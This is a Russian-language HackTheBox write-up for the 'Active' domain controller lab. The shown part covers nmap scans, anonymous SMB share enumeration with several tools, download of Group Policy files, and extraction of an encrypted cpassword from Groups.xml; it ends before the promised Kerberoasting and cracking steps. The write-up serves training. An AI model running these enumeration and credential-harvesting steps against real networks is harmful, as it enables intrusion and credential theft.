---
layout: post
title: "HTB{ Active }"
date: 2018-12-17 00:00:00 +0300
author: snovvcrash
categories: ctf write-ups boxes hackthebox
tags: [ctf, write-ups, boxes, hackthebox, Active, windows, active-directory, smb, smbclient, smbmap, enum4linux, nullinux, gpp, gpp-decrypt, kerberos, kerberoasting, impacket, hashcat]
comments: true
published: true
---

**Active** — максимально простая, однако, в то же время, одна из самых полезных для прохождения Windows-машин в своей "ценовой категории" на HTB. Почему? Так это же *контроллер домена AD*! Тезисный обзор предлагаемых развлечений: энумерация *SMB-шар* (используем tуеву hучу крутых утилит а-ля *smbclient*, *smbmap*, *enum4linux*, *nullinux*); разграбление SMB с анонимным доступом для захвата файла групповых политик *Groups.xml*; декрипт GPP-пароля из той самой xml'ки; получение доступа к внутридоменному аккаунту с последующей инициализацией атаки типа *Kerberoasting* (против протокола аутентификации *Kerberos*) для извлечения тикета администратора с помощью коллекции Python-скриптов *impacket* для работы с сетевыми протоколами; наконец, офлайн-восстановление пароля администратора из хеша (с помощью *Hashcat*) для окончательного pwn'а контроллера. *«...Лежа в пещере своей, в три глотки лаял огромный Цербер, и лай громовой оглашал молчаливое царство...»*{:style="color:#a8a8a8;"} **Сложность: 4.6/10**{:style="color:orange;"}

<!--cut-->

{: .center-image}
[![active-banner.png]({{ "/img/htb/boxes/active/active-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/148 "Hack The Box :: Active")

{: .center-image}
![active-info.png]({{ "/img/htb/boxes/active/active-info.png" | relative_url }})

* TOC
{:toc}

# Разведка
## Nmap
Initial:
```text
root@kali:~# nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.100
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sat Dec 15 23:26:06 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.14s latency).
Scanned at 2018-12-15 23:26:06 MSK for 1s
Not shown: 983 closed ports
Reason: 983 resets
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Dec 15 23:26:07 2018 -- 1 IP address (1 host up) scanned in 0.80 seconds
```

Version ([красивый отчет]({{ "/nmap/htb/active/version.html" | relative_url }})):
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl 10.10.10.100
...
```

```text
root@kali:~# cat nmap/version.nmap
# Nmap 7.70 scan initiated Sat Dec 15 23:26:38 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version --stylesheet https://raw.githubusercontent.com/snovvcrash/snovvcrash.github.io/master/nmap/nmap-bootstrap.xsl 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up, received echo-reply ttl 127 (0.14s latency).
Scanned at 2018-12-15 23:26:38 MSK for 200s
Not shown: 983 closed ports
Reason: 983 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2018-12-15 20:19:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7m07s, deviation: 0s, median: -7m07s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53842/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 43653/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2018-12-15 23:20:56
|_  start_date: 2018-12-11 03:34:26

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 15 23:29:58 2018 -- 1 IP address (1 host up) scanned in 200.67 seconds
```

Много всего видим, оно и понятно — это же Windows-коробка. Из самого интересного: это контроллер доменов Active Directory на Windows Server 2008; `microsoft-ds?` (он же *Microsoft Directory Services* или *SMB*) — сетевые шары на 445-м; Kerberos — на 88-м (система аутентификации) и 464-м (KPASSWD) портах.

Начнем с очевидного — посмотрим, что скрывает SMB.

## Энумерация SMB — Порт 445
Заголовок параграфа тянет на название обширной статьи. Вкратце рассмотрим некоторые полезные тулзы для срыва покровов с SMB-шар.

### NSE (Nmap Scripting Engine)
У всемогущего Nmap'а есть целый калейдоскоп скриптов на все случаи жизни. Вытягивание информации об SMB — не исключение.

Посмотрим, что есть в ассортименте из категорий "default" / "version" / "safe":
```text
root@kali:~# locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse:categories = {"vuln", "safe", "malware"}
/usr/share/nmap/scripts/smb-enum-services.nse:categories = {"discovery","intrusive","safe"}
/usr/share/nmap/scripts/smb-ls.nse:categories = {"discovery", "safe"}
/usr/share/nmap/scripts/smb-mbenum.nse:categories = {"discovery", "safe"}
/usr/share/nmap/scripts/smb-os-discovery.nse:categories = {"default", "discovery", "safe"}
/usr/share/nmap/scripts/smb-protocols.nse:categories = {"safe", "discovery"}
/usr/share/nmap/scripts/smb-security-mode.nse:categories = {"default", "discovery", "safe"}
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse:categories = {"vuln", "safe"}
/usr/share/nmap/scripts/smb2-capabilities.nse:categories = {"safe", "discovery"}
/usr/share/nmap/scripts/smb2-security-mode.nse:categories = {"safe", "discovery", "default"}
/usr/share/nmap/scripts/smb2-time.nse:categories = {"discovery", "safe", "default"}
/usr/share/nmap/scripts/smb2-vuln-uptime.nse:categories = {"vuln", "safe"}
```

И натравим безопасные (safe) творения скриптового движка на 445-й порт:
```text
root@kali:~# nmap -n --script safe -oA nmap/nse-smb-enum -p445 10.10.10.100
...
```

```text
root@kali:~# cat nmap/nse-smb-enum.nmap
# Nmap 7.70 scan initiated Sun Dec 16 00:03:51 2018 as: nmap -n --script safe -oA nmap/nse-smb-enum -p445 10.10.10.100
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 10.0.2.16
|     Subnet Mask: 255.255.255.0
|     Router: 10.0.2.2
|     Domain Name Server: 192.168.1.1
|_    Server Identifier: 10.0.2.2
| broadcast-ping: 
|   IP: 192.168.1.140  MAC: 52:54:00:12:35:02
|_  Use --script-args=newtargets to add the results as targets
|_eap-info: please specify an interface with -e
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for 10.10.10.100
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
|_clock-skew: mean: -7m06s, deviation: 0s, median: -7m06s
|_fcrdns: FAIL (No PTR record)
|_ipidseq: Incremental!
|_msrpc-enum: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
|_path-mtu: PMTU == 1500
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: ERROR: Server disconnected the connection
| smb-protocols: 
|   dialects: 
|     2.02
|_    2.10
| smb2-capabilities: 
|   2.02: 
|     Distributed File System
|   2.10: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2018-12-15 23:57:31
|_  start_date: 2018-12-11 03:34:26
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.10.10.100
# Nmap done at Sun Dec 16 00:05:02 2018 -- 1 IP address (1 host up) scanned in 71.04 seconds
```

Несмотря на обилие букв ничего полезного мы не имеем, только узнали, что это протокол 2-й версии — SMBv2. Идем дальше.

### smbclient
Базовая утилита для подключения к SMB.

Для начала посмотрим, какие есть шары в принципе; анонимного (aka *Null Authentication*) доступа для этого достаточно:
```text
root@kali:~# smbclient -N -L 10.10.10.100
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Все стандартно, глянем на содержимое `Replication`:
```text
root@kali:~# smbclient -N '\\10.10.10.100\Replication'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 13:37:44 2018
  ..                                  D        0  Sat Jul 21 13:37:44 2018
  active.htb                          D        0  Sat Jul 21 13:37:44 2018

                10459647 blocks of size 4096. 4946059 blocks available
```

Чтобы не ходить по всем директориям вручную, пойдем на следующую хитрость: активируем опцию рекурсивного обхода шары, выключим надоедливый промпт, дабы он не заставлял нас подтверждать каждое действие и сделаем полный слепок `Replication` как показано ниже:
```text
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as GPE.INI (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as GptTmpl.inf (2.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.0 KiloBytes/sec) (average 0.8 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Registry.pol (5.1 KiloBytes/sec) (average 1.7 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as GPT.INI (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as GptTmpl.inf (6.8 KiloBytes/sec) (average 2.2 KiloBytes/sec)
```

Теперь мы имеем офлайн-копию папки с общем доступом `Replication`. Вывести список файлов для более наглядного анализа содержимого можно с помощью find:
```text
root@kali:~# find active.htb -type f
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
```

Пока не будем закапываться дальше, а пройдемся по другим утилитам, позволяющим провести подобную разведку.

### smbmap
Очень классная штука, позволяющая играючи сделать то же самое, что я показал в [smbclient]({{ page.url }}#smbclient), но без необходимости так изощряться.

Сначала сканируем сервер целиком:
```text
root@kali:~# smbmap -d active.htb -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                NO ACCESS
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS
        Users                                                   NO ACCESS
```

Сразу видим колонку с текущими доступами (в данном случае при Null Authentication), что весьма удобно.

Легким движением руки просим у smbmap рекурсивный листинг файлов директории `Replication`:
```text
root@kali:~# smbmap -d active.htb -H 10.10.10.100 -R Replication
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions
        ----                                                    -----------
        Replication                                             READ ONLY
        .\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    active.htb
        .\\active.htb\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    scripts
        .\\active.htb\DfsrPrivate\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Installing
        .\\active.htb\Policies\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--               23 Sat Jul 21 13:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    USER
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--              119 Sat Jul 21 13:38:11 2018    GPE.INI
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Preferences
        -r--r--r--             2788 Sat Jul 21 13:38:11 2018    Registry.pol
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Windows NT
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    SecEdit
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--             1098 Sat Jul 21 13:38:11 2018    GptTmpl.inf
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Groups
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--              533 Sat Jul 21 13:38:11 2018    Groups.xml
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--               22 Sat Jul 21 13:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    USER
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Microsoft
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    Windows NT
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    SecEdit
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 13:37:44 2018    ..
        -r--r--r--             3722 Sat Jul 21 13:38:11 2018    GptTmpl.inf
```

Следующим легким движением руки просим smbmap забрать понравившийся нам файл (спойлер: это *Groups.xml*), указав при этом флаг `-q`, чтобы не смотреть на листинг очередной раз:
```text
root@kali:~# smbmap -H 10.10.10.100 -R Replication -A Groups.xml -q
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions
        ----                                                    -----------
        Replication                                             READ ONLY
        [+] Starting search for files matching 'Groups.xml' on share Replication.
        [+] Match found! Downloading: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

Единственное, о чем нужно помнить — о том, что smbmap не сохраняет скачанные файлы в рабочую директорию. Поэтому обновим базу данных утилиты `locate` и выясним, что директория для сохранения файлов по умолчанию есть `/usr/share/smbmap`:
```text
root@kali:~# updatedb
root@kali:~# locate Groups.xml
/usr/share/smbmap/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
```

### enum4linux
Классика жанра, хотя немного устаревшая [софтина](https://github.com/portcullislabs/enum4linux "portcullislabs/enum4linux: enum4Linux is a Linux alternative to enum.exe for enumerating data from Windows and Samba hosts.") на Перле для сбора информации о Windows- (Samba-) хостах.

Мне не очень нравится, т. к. выводит гору лишней информации, но попробуем ради искусства:
```text
root@kali:~# enum4linux 10.10.10.100 | tee enum4linux/active.enum4linux 2>/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 16 14:49:42 2018

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.10.100    |
 ====================================================
[E] Can't find workgroup/domain


 ============================================
|    Nbtstat Information for 10.10.10.100    |
 ============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
Looking up status of 10.10.10.100
No reply from 10.10.10.100

 =====================================
|    Session Check on 10.10.10.100    |
 =====================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[+] Server 10.10.10.100 allows sessions using username '', password ''
[+] Got domain/workgroup name:

 ===========================================
|    Getting domain SID for 10.10.10.100    |
 ===========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================
|    OS information on 10.10.10.100    |
 ======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.100 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED

 =============================
|    Users on 10.10.10.100    |
 =============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 =========================================
|    Share Enumeration on 10.10.10.100    |
 =========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/ADMIN$   Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/C$       Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/IPC$     Mapping: OK     Listing: DENIED
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/Replication      Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//10.10.10.100/SYSVOL   Mapping: DENIED, Listing: N/A
//10.10.10.100/Users    Mapping: DENIED, Listing: N/A

 ====================================================
|    Password Policy Information for 10.10.10.100    |
 ====================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.100)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[E] Failed to get password policy with rpcclient


 ==============================
|    Groups on 10.10.10.100    |
 ==============================

[+] Getting builtin groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED

[+] Getting builtin group memberships:

[+] Getting local groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[E] Can't get local groups: NT_STATUS_ACCESS_DENIED

[+] Getting local group memberships:

[+] Getting domain groups:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED

[+] Getting domain group memberships:

 =======================================================================
|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.

 =============================================
|    Getting printer info for 10.10.10.100    |
 =============================================
could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
could not obtain sid from server
error: NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Dec 16 14:50:32 2018
```

### nullinux.py
Этакая [обновленная альтернатива](https://github.com/m8r0wn/nullinux/blob/master/setup.sh "m8r0wn/nullinux: Internal penetration testing tool for Linux that can be used to enumerate OS information, domain information, shares, directories, and users through SMB.") [enum4linux]({{ page.url }}#enum4linux).

Может то же самое, только красивее и без кучи сообщений об ошибках:
```text
root@kali:~# python nullinux.py -a 10.10.10.100

    Starting nullinux v5.3.0 | 12-16-2018 15:01



[*] Enumerating Shares for: 10.10.10.100
        Shares                     Comments
   -------------------------------------------
    \\10.10.10.100\ADMIN$          Remote Admin
    \\10.10.10.100\C$              Default share
    \\10.10.10.100\IPC$
    \\10.10.10.100\NETLOGON        Logon server share
    \\10.10.10.100\Replication
    \\10.10.10.100\SYSVOL          Logon server share
    \\10.10.10.100\Users

   [*] Enumerating: \\10.10.10.100\Replication
       .                                   D        0  Sat Jul 21 13:37:44 2018
       ..                                  D        0  Sat Jul 21 13:37:44 2018
       active.htb                          D        0  Sat Jul 21 13:37:44 2018

[*] Enumerating Domain Information for: 10.10.10.100
[-] Could not attain Domain SID

[*] Enumerating querydispinfo for: 10.10.10.100

[*] Enumerating enumdomusers for: 10.10.10.100

[*] Enumerating LSA for: 10.10.10.100

[*] Performing RID Cycling for: 10.10.10.100
[-] RID Failed: Could not attain Domain SID

[*] Testing 10.10.10.100 for Known Users

[*] Enumerating Group Memberships for: 10.10.10.100

[-] No valid users or groups detected
```

Достаточно обзора инструментов, перейдем к смотру того, что мы вытащили с SMB.

# GPP (Group Policy Preferences)
Когда задаются настройки групповых политик (GPP), в шаре *SYSVOL* создается файл `Groups.xml`, содержащий соответствующие конфигурации. Помимо всего прочего этот файл содержит пароли пользователей в поле `cpassword`:
```text
root@kali:~# cat Groups.xml | grep -o 'cpassword="[^"]\+"\|userName="[^"]\+"'
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
